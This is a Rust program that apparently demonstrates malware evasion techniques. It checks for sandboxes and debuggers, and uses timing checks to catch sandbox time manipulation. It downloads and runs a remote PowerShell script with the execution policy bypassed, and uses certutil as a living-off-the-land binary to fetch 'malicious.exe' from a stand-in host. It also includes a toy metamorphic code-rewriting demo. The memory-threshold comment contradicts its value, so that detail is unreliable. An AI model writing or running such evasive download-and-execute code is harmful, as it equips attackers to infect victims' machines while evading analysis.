use sysinfo::System;
use std::process::exit;
use std::time::{Instant, SystemTime, Duration};
use std::thread::sleep;
use std::process::Command;
use rand::Rng;
use rand::distributions::Alphanumeric;

#[cfg(windows)]
extern crate winapi;
#[cfg(windows)]
use winapi::um::debugapi::IsDebuggerPresent;

pub fn check_memory_limit() {
    let mut system = System::new_all();
    system.refresh_memory();

    let total_memory = system.total_memory(); // in kilobytes
    // Heuristic: If total memory is unusually low, suspect sandboxing...
    if total_memory < 4_000_000_000 { // Less than 512MB
        println!("Program is likely running in a sandboxed environment.");
        exit(1);
    } 
}

pub fn sleep_evasion(sleep_duration: Duration) {
    let start_instant = Instant::now();
    let start_system_time = SystemTime::now();

    sleep(sleep_duration);

    let elapsed_instant = start_instant.elapsed();
    let elapsed_system_time = SystemTime::now()
        .duration_since(start_system_time)
        .unwrap_or_default();

    if elapsed_instant < sleep_duration || elapsed_system_time < sleep_duration {
        println!("Detected sandbox time manipulation!");
        exit(1);
    }
}

#[cfg(windows)]
pub fn check_debugger() {
    unsafe {
        if IsDebuggerPresent() != 0 {
            println!("Debugger detected! Exiting program.");
            exit(1);
        }
    }
}

/// This function demonstrates a fileless execution technique with enhanced evasion and in-memory execution.
pub fn fileless_technique() {
    // Randomize parts of the PowerShell command for obfuscation
    let base_command = "Invoke-WebRequest";
    let obfuscated_command = format!("{} -Uri '{}'", base_command, "http://example.com/malicious-script.ps1");
    let download_command: String = format!(
        "{} -OutFile '$env:TEMP\\script.ps1'; powershell.exe -ExecutionPolicy Bypass -File $env:TEMP\\script.ps1",
        obfuscated_command
    );

    // Construct and obfuscate PowerShell execution
    let powershell_command = format!(
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"{}\"",
        download_command
    );

    // Execute using cmd to simulate real-world execution
    match Command::new("cmd")
        .args(&["/C", &powershell_command])
        .output()
    {
        Ok(output) => println!("Command executed successfully: {:?}", output),
        Err(e) => println!("Failed to execute command: {}", e),
    }

    // Alternative: Using LOLBins with certutil
    let certutil_command = format!(
        "certutil.exe -urlcache -split -f \"{}\" \"{}\"",
        "http://example.com/malicious.exe", "$env:TEMP\\malicious.exe"
    );

    match Command::new("cmd")
        .args(&["/C", &certutil_command])
        .output()
    {
        Ok(output) => println!("Certutil executed successfully: {:?}", output),
        Err(e) => println!("Failed to execute certutil: {}", e),
    }
}

/// This function demonstrates an advanced metamorphic technique with added obfuscation and control flow changes.
pub fn metamorphic_technique() {
    let rng = rand::thread_rng();

    // Original code snippet
    let original_code = r#"
        let a = 10;
        let b = 20;
        let sum = a + b;
        println!("Sum: {}", sum);
    "#.to_string();

    // Generate random variable names and alternate logic
    let new_var1: String = rng.clone().sample_iter(Alphanumeric).take(5).map(char::from).collect();
    let new_var2: String = rng.clone().sample_iter(Alphanumeric).take(5).map(char::from).collect();
    let new_var3: String = rng.clone().sample_iter(Alphanumeric).take(5).map(char::from).collect();

    // Introduce an alternate logic path
    let alternate_logic = if rng.clone().gen_bool(0.5) {
        format!("let {} = {} + {};", new_var3, new_var1, new_var2)
    } else {
        format!("let {} = {} * 2 - ({} - 10);", new_var3, new_var1, new_var2)
    };

    let transformed_code = format!(
        r#"
        let {} = 10;
        let {} = 20;
        {};
        println!("Sum: {{}}", {});
    "#,
        new_var1, new_var2, alternate_logic, new_var3
    );

    println!("Original code:\n{}", original_code);
    println!("Transformed code:\n{}", transformed_code);
}

pub fn main() {
   
    
    check_memory_limit();
    sleep_evasion(Duration::from_secs(1));
    #[cfg(windows)]
    check_debugger();
    
    fileless_technique();
    metamorphic_technique();
}
